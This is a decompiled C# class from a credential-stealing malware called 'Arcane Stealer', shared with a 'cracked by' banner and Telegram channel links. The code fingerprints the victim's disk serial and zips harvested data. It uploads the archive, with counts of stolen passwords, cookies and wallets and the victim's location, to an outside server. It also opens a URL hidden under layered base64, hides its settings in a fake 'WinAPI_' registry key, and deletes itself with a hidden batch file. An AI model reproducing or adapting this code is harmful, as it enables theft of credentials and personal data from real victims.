// Cracked by Milfachs. t.me/milfachs or t.me/stroleyman.
// Telegram Channel - t.me/darkwanna

using Microsoft.Win32;
using Stealer;
using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Net;
using System.Text;
using System.Threading;

internal class Class4
{
  private static Mutex mutex_0;

  public static string smethod_0()
  {
    try
    {
      ManagementObject managementObject = new ManagementObject("win32_logicaldisk.deviceid=\"" + Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\"");
      managementObject.Get();
      char[] charArray = managementObject["VolumeSerialNumber"].ToString().ToCharArray();
      Array.Reverse((Array) charArray);
      return Convert.ToBase64String(Encoding.UTF8.GetBytes(charArray.ToString())).Replace("=", "").ToUpper();
    }
    catch (Exception ex)
    {
      return Convert.ToBase64String(Encoding.UTF8.GetBytes(Class4.smethod_2())).Replace("=", "").ToUpper();
    }
  }

  public static bool smethod_1()
  {
    bool createdNew;
    Class4.mutex_0 = new Mutex(true, Program.id, out createdNew);
    return createdNew;
  }

  public static string smethod_2()
  {
    return Path.GetRandomFileName().Replace(".", "");
  }

  public static void smethod_3(string string_0, string string_1)
  {
    try
    {
      ZipFile.CreateFromDirectory(string_0, string_1, CompressionLevel.Optimal, false);
    }
    catch
    {
    }
  }

  public static void smethod_4(string string_0, object object_0, object object_1)
  {
    try
    {
      new WebClient().UploadFile("https://arcane.es3n.in/u.php?name=" + (string) object_1 + "&hwid=" + Class4.smethod_0() + "&ci=" + (string) object_0 + "&p=" + Class7.string_0 + "&c=" + Class7.string_1 + "&a=" + Class7.string_2 + "&f=" + Class7.string_3 + "&t=" + Class7.string_4 + "&fz=" + Class7.string_5 + "&s=" + Class7.string_6 + "&cr=" + Class7.string_7 + "&ds=" + Class7.string_8 + (Class7.string_10 != "" ? "&dd=" + Class7.string_10.Replace(";", "\r\n") : "&dd=") + "&pd=" + Class7.string_9 + "&ct=" + Program.geo.Split('?')[1] + "&cy=" + Program.geo.Split('?')[2] + "&cc=" + Program.geo.Split('?')[3], "POST", string_0);
    }
    catch
    {
    }
  }

  public static void smethod_5(string string_0)
  {
    try
    {
      new WebClient().OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(Encoding.UTF8.GetString(Convert.FromBase64String(string_0)))))));
    }
    catch
    {
    }
  }

  public static void smethod_6(object object_0, object object_1)
  {
    string path = Environment.GetEnvironmentVariable("LocalAppData") + "\\delete.bat";
    StreamWriter streamWriter = new StreamWriter(path);
    streamWriter.WriteLine("@echo off\r\nrd /q /s \"{1}\"\r\nerase /q \"{0}\"\r\ndel \"% ~f0\"", object_1, object_0);
    streamWriter.Close();
    try
    {
      Process.Start(new ProcessStartInfo()
      {
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        FileName = path
      });
    }
    catch
    {
    }
    Environment.Exit(0);
  }

  public static void smethod_7(string string_0, object object_0)
  {
    try
    {
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey("WinAPI_" + Program.id);
      subKey.SetValue(string_0, object_0);
      subKey.Close();
    }
    catch
    {
    }
  }

  public static string smethod_8(string string_0)
  {
    string str = (string) null;
    try
    {
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey("WinAPI_" + Program.id);
      str = subKey.GetValue(string_0).ToString();
      subKey.Close();
    }
    catch
    {
    }
    return str;
  }

  public static void smethod_9(string string_0, string string_1, string string_2)
  {
    try
    {
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(string_0);
      httpWebRequest.Headers.Add("Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
      httpWebRequest.UserAgent = string_1;
      httpWebRequest.Referer = "Arcane Stealer [" + string_2 + "]";
      using (StreamReader streamReader = new StreamReader(httpWebRequest.GetResponse().GetResponseStream(), Encoding.UTF8))
        streamReader.ReadToEnd();
    }
    catch
    {
    }
  }

  public Class4()
  {
    Class11.ARXWv9qzu32dU();
    // ISSUE: explicit constructor call
    base.\u002Ector();
  }
}
